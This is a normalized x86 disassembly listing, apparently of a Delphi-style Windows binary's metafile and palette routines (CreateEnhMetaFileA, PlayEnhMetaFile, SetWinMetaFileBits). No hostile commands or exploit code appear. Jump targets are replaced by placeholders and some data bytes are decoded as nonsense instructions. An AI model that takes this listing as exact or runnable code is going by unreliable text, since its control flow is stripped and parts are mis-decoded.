mov edx [ ebx + 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
sub_427810
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0xc ]
mov eax esi
mov edx edi
call sub_403378
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4031ec
xor eax eax
mov [ ebx + 0xc ] eax
mov dl 0x1
mov eax edi
call [ eax + 0x48 ]
mov esi eax
mov [ ebx + 0xc ] esi
mov [ esi + 0x14 ] ebx
mov eax ebx
mov dx 0xfffd
call sub_403400
mov [ esi + 0x10 ] eax
mov [ esi + 0x1c ] ebx
mov eax ebx
mov dx 0xfffc
call sub_403400
mov [ esi + 0x18 ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_4033e8
sub_4278bc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test esi esi
je r-xdata
xor eax eax
push ebp
push sub_42794c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0xc ]
call sub_4031ec
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_4033e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
call sub_403134
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_403400
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_403400
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42796c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_427a90
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_408870
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx 0x1
call sub_4044dc
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4272a4
test eax eax
jne r-xdata
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_427a2f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_403400
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb48
call sub_4039b8
mov eax [ ebx + 0xc ]
call sub_4031ec
mov esi [ ebp - 0x8 ]
mov [ ebx + 0xc ] esi
mov [ esi + 0x14 ] ebx
mov eax ebx
mov dx 0xfffd
call sub_403400
mov [ esi + 0x10 ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_4033e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427a97
lea eax [ ebp - 0x14 ]
call sub_403f7c
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_427ad0
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
xor edx edx
mov eax esi
call sub_4278bc
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov edx [ ebx + 0xc ]
mov eax esi
call sub_4278bc
jmp r-xdata
mov edx ebx
mov eax esi
call sub_4193d8
mov edx ebx
mov eax esi
call sub_4278bc
jmp r-xdata
pop esi
pop ebx
retn
sub_427b2c
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx edx
push 0x0
mov eax [ ebp + 0x8 ]
push eax
call sub_42772c
mov ecx esi
mov edx ebx
call sub_427210
pop esi
pop ebx
pop ebp
retn 0x4
sub_427b50
push ebx
mov ebx eax
cmp [ ebx + 0x12 ] 0x0
je r-xdata
cmp [ ebx + 0x18 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_427b74
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x22 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_427b9c
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_427ca3
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x44 ]
mov ecx 0x1
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
xor ecx ecx
mov cl [ ebp - 0x44 ]
lea edx [ ebp - 0x43 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
lea eax [ ebp - 0x48 ]
lea edx [ ebp - 0x44 ]
call sub_4041e0
mov edx [ ebp - 0x48 ]
mov eax [ rw-data ]
call sub_42733c
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
call sub_4031ec
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_427c25
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_4033e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427caa
lea eax [ ebp - 0x48 ]
call sub_403f7c
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_403400
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_403400
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_427c2a
mov eax [ ebp - 0x4 ]
call sub_4031ec
call sub_4039e0
call sub_403a34
mov eax [ ebx + 0xc ]
call sub_4031ec
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_4033e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427caa
lea eax [ ebp - 0x48 ]
call sub_403f7c
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_403400
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_403400
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_427cb4
push ebx
push esi
push edi
add esp 0xfffffec0
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
je r-xdata
mov [ esp ] 0x0
lea edx [ esp + 0x40 ]
mov eax [ edi ]
call sub_40313c
lea edx [ esp + 0x40 ]
mov eax esp
mov cl 0x3f
call sub_402ae8
jmp r-xdata
add esp 0x140
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor ecx ecx
mov cl [ esp ]
inc ecx
mov edx esp
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
sub_427d10
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0xc ] 0x0
setne bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ebx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
cmp eax [ ebx + 0xc ]
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
sub_427d8c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_427b9c
mov eax [ ebp - 0x8 ]
push eax
push sub_427cb4
push ebp
call sub_427d10
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_427e08
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
call sub_423a18
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4031dc
test bl bl
jle r-xdata
push eax
call DeleteEnhMetaFile
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_427e48
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_427eb8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax edi
call sub_428318
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_428380
mov eax [ ebp - 0x8 ]
push eax
mov ecx edi
xor edx edx
mov eax esi
call sub_427ee0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427ebf
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fa0
retn
add esp 0xfffffff0
call sub_403550
sub_427ebf
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_427ee0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
xor eax eax
push ebp
push sub_4280ec
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4250c4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x58 ] edi
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403550
xor edx edx
push ebp
push sub_4280cf
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_428494
test eax eax
jne r-xdata
push 0x0
call GetDC
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_42847c
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x2c ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_42847c
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_428494
mov ecx eax
xor edx edx
xor eax eax
call sub_41776c
mov eax ebx
call sub_40423c
test eax eax
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x20 ]
test eax eax
jne r-xdata
push 0x8
mov eax [ ebp - 0xc ]
push eax
call GetDeviceCaps
push eax
push 0x4
mov eax [ ebp - 0xc ]
push eax
call GetDeviceCaps
imul eax eax 0x64
push eax
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0x58 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x2c ]
push eax
call MulDiv
mov edx eax
mov eax edi
call sub_428af4
push 0x4
mov eax [ ebp - 0xc ]
push eax
call GetDeviceCaps
imul edx eax 0x64
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_428af4
jmp r-xdata
push ebx
push r-xdata
push esi
push r-xdata
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_4042fc
mov eax [ ebp - 0x20 ]
call sub_40443c
jmp r-xdata
mov eax esi
call sub_40423c
test eax eax
jle r-xdata
push 0xa
mov eax [ ebp - 0xc ]
push eax
call GetDeviceCaps
push eax
push 0x6
mov eax [ ebp - 0xc ]
push eax
call GetDeviceCaps
imul eax eax 0x64
push eax
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0x58 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
call MulDiv
mov edx eax
mov eax edi
call sub_428ab8
push 0x6
mov eax [ ebp - 0xc ]
push eax
call GetDeviceCaps
imul edx eax 0x64
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_428ab8
jmp r-xdata
push eax
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
call CreateEnhMetaFileA
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4257b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4280d6
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
call sub_425a88
retn
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
sub_4280f3
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_428127
inc [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
call sub_4035b8
mov ebx edx
mov edi eax
mov eax edi
call sub_425738
mov esi eax
xor edx edx
mov eax edi
call sub_4257b8
push esi
call CloseEnhMetaFile
mov edx eax
mov eax [ edi + 0x58 ]
call sub_4289b4
mov edx ebx
and dl 0xfc
mov eax edi
call sub_425188
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035a0
sub_42817c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_426cb0
mov [ esi + 0x2c ] 0x1
mov [ esi + 0x21 ] 0x1
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_4281c4
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_429370
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4193ac
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_4281f4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
test esi esi
je r-xdata
mov edi [ eax + 0x14 ]
call sub_429370
mov edx esi
mov eax ebx
call sub_4193d8
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebx + 0x28 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
mov edx [ eax + 0x28 ]
mov [ ebx + 0x28 ] edx
mov al [ eax + 0x2c ]
mov [ ebx + 0x2c ] al
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x28 ]
call sub_42936c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
cmp edi eax
je r-xdata
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov al 0x1
pop edi
pop esi
pop ebx
retn
sub_428288
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
mov esi eax
xor ebp ebp
test esi esi
je r-xdata
mov eax [ esp ]
push esi
push edi
mov esi eax
lea edi [ esp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
dec [ esp + 0xc ]
dec [ esp + 0x10 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
mov eax edi
call sub_425738
push eax
call PlayEnhMetaFile
test esi esi
je r-xdata
push 0xffffffff
push esi
mov eax edi
call sub_425738
push eax
call SelectPalette
mov ebp eax
mov eax edi
call sub_425738
push eax
call RealizePalette
push 0xffffffff
push ebp
mov eax edi
call sub_425738
push eax
call SelectPalette
sub_428318
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_403f7c
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileDescriptionA
mov edi eax
test edi edi
jle r-xdata
mov eax esi
mov edx edi
call sub_4045c8
mov eax [ esi ]
call sub_40443c
push eax
push edi
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileDescriptionA
mov eax [ esi ]
call sub_40443c
call sub_408968
mov edx eax
mov eax esi
call sub_4045c8
sub_428380
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax ebx
call sub_403f7c
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileDescriptionA
mov edi eax
test edi edi
jle r-xdata
mov eax ebx
mov edx edi
call sub_4045c8
mov eax [ ebx ]
call sub_40443c
push eax
push edi
mov eax [ esi + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileDescriptionA
mov eax [ ebx ]
call sub_40443c
call sub_408968
mov ecx eax
inc ecx
mov eax ebx
mov edx 0x1
call sub_4044dc
mov eax [ ebx ]
call sub_40443c
call sub_408968
mov edx eax
mov eax ebx
call sub_4045c8
sub_428418
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_4285f0
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x54 ] 0x64
push eax
mov eax [ esp + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
jmp r-xdata
mov eax [ ebx + 0x20 ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_4284ac
push ebx
push esi
push edi
add esp 0xfffffbfc
mov ebx eax
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax edi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x14 ]
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov esi eax
test esi esi
je r-xdata
cmp esi 0x100
jle r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x14 ]
call sub_423a18
mov [ esp ] 0x300
mov [ esp + 0x2 ] si
lea eax [ esp + 0x4 ]
push eax
push esi
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov eax esp
push eax
call CreatePalette
mov edx [ ebx + 0x28 ]
mov [ edx + 0x14 ] eax
and esi 0xff
sub_428538
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_4285f0
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x50 ] 0x64
push eax
mov eax [ esp + 0x4c ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
jmp r-xdata
mov eax [ ebx + 0x1c ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_42859c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_428ba8
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_41b39c
pop ecx
sub ecx eax
mov edx esi
mov eax ebx
call sub_428754
mov edx esi
mov eax ebx
call sub_428684
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
retn
sub_4285f0
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x28 ]
call sub_429370
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov esi eax
mov [ ebx + 0x28 ] esi
mov eax esi
call sub_42936c
pop esi
pop ebx
retn
sub_428618
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
cmp [ esp ] 0x4
jg r-xdata
mov edx esi
mov eax ebx
call sub_428ba8
test al al
je r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
mov ecx [ esp ]
sub ecx 0x4
mov edx esi
mov eax ebx
call sub_428754
mov edx esi
mov eax ebx
call sub_428684
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edx
pop edi
pop esi
pop ebx
retn
sub_428684
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4285f0
lea edx [ ebp - 0x68 ]
mov ecx 0x64
mov eax edi
call sub_41b5c8
cmp [ ebp - 0x40 ] 0x464d4520
je r-xdata
mov eax [ ebp - 0x38 ]
call sub_40276c
mov [ ebp - 0x4 ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_428744
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x68 ]
mov ecx 0x64
call sub_402968
mov ecx [ ebp - 0x38 ]
sub ecx 0x64
mov edx [ ebp - 0x4 ]
add edx 0x64
mov eax edi
call sub_41b5c8
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
call SetEnhMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_425a28
mov [ ebx + 0x18 ] 0x0
mov eax [ ebp - 0x48 ]
sub eax [ ebp - 0x50 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ ebx + 0x10 ] eax
mov [ esi + 0x2c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42874b
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_40278c
retn
call sub_425a28
sub_428754
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_4285f0
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x22 ] 0x9ac6cdd7
jne r-xdata
call sub_425a28
lea eax [ ebp - 0x22 ]
call sub_426878
cmp ax [ ebp - 0xe ]
je r-xdata
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x18 ]
movsx edx [ ebp - 0x1c ]
sub eax edx
push eax
call MulDiv
mov [ ebx + 0xc ] eax
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x16 ]
movsx edx [ ebp - 0x1a ]
sub eax edx
push eax
call MulDiv
mov [ ebx + 0x10 ] eax
mov [ ebp - 0x32 ] 0x8
xor eax eax
mov [ ebp - 0x2e ] eax
xor eax eax
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
mov [ ebp - 0x14 ] 0x60
sub [ ebp - 0x8 ] 0x16
mov eax [ ebp - 0x8 ]
call sub_40276c
mov [ ebp - 0xc ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_4288c3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ esi + 0x28 ]
mov dx [ ebp - 0x14 ]
mov [ eax + 0x18 ] dx
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
lea eax [ ebp - 0x96 ]
push eax
push 0x64
mov eax [ ebx + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov [ ebp - 0x32 ] 0x8
mov eax [ ebp - 0x76 ]
mov [ ebp - 0x2e ] eax
mov eax [ ebp - 0x72 ]
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
mov eax [ ebx + 0x8 ]
push eax
call DeleteEnhMetaFile
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_425a28
mov [ esi + 0x2c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4288ca
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_40278c
retn
call sub_425a28
sub_4288d4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42897b
push [ fs : eax ]
